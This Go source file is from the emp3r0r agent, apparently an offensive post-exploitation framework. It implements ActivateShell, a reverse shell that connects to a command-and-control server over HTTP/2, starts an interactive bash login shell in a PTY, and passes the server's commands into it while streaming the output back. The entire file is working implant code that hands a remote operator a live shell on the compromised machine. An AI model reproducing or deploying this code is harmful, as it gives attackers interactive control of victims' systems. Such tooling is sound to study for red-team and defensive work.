package agent

import (
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"

	"github.com/creack/pty"
	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

// ActivateShell launch reverse shell and send it to CC
func ActivateShell() {
	var (
		err       error
		streamURL = CCAddress + tun.StreamAPI

		conn        *h2conn.Conn // reverse shell uses this connection
		isShellExit = false      // when to exit
		shellPID    = 0          // PID of the bash shell
	)

	conn, _, _, err = ConnectCC(streamURL)
	cleanup := func() {
		proc, err := os.FindProcess(shellPID)
		if err != nil {
			log.Print("bash shell already gone: ", err)
		}
		err = proc.Kill()
		if err != nil {
			log.Print("Killing bash: ", err)
		}
		err = conn.Close()
		if err != nil {
			log.Print("Closing reverseBash connection: ", err)
		}
		log.Print("bash shell has been cleaned up")
	}
	defer cleanup()

	go reverseShell(SendCC, RecvCC, &isShellExit, &shellPID)

	go func() {
		for {
			if isShellExit {
				return
			}
			if conn == nil {
				continue
			}
			data := make([]byte, BufSize)
			_, err = conn.Read(data)
			if err != nil {
				log.Print("Read remote: ", err)
				cleanup()
				isShellExit = true
				return
			}
			RecvCC <- data
		}
	}()

	for outgoing := range SendCC {
		if isShellExit {
			return
		}
		_, err = conn.Write(outgoing)
		if err != nil {
			log.Print("Send to remote: ", err)
			isShellExit = true
		}
	}
}

// reverseShell - Execute a reverse shell to host
func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool, pid *int) {
	cmd := exec.Command("bash", "-li")

	initWinSize := pty.Winsize{Rows: 23, Cols: 80}
	shellf, err := pty.StartWithSize(cmd, &initWinSize)
	if err != nil {
		log.Print("start bash: ", err)
		return
	}
	*pid = cmd.Process.Pid

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, shellf); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	defer func() {
		err = shellf.Close()
		if err != nil {
			log.Print("Closing shellf: ", err)
		}
		*finished = true
		log.Print("reverseShell exited")
	}()

	// write CC's input to bash's PTY stdin
	go func() {
		for incoming := range recv {
			if strings.HasPrefix(string(incoming), "exit\n") {
				log.Print("Exiting due to 'exit' command")
				_, err = shellf.WriteString("exit\n")
				if err != nil {
					log.Print("failed to exit bash shell: ", err)
				}
				log.Print("bash shell exited")
				return
			}
			_, err := shellf.Write(incoming)
			if err != nil {
				log.Print("shell write stdin: ", err)
				return
			}
		}
	}()

	// read from bash's PTY output
	for {
		buf := make([]byte, BufSize)
		_, err = shellf.Read(buf)
		send <- buf
		if err != nil {
			log.Print("shell read: ", err)
			return
		}
	}
}
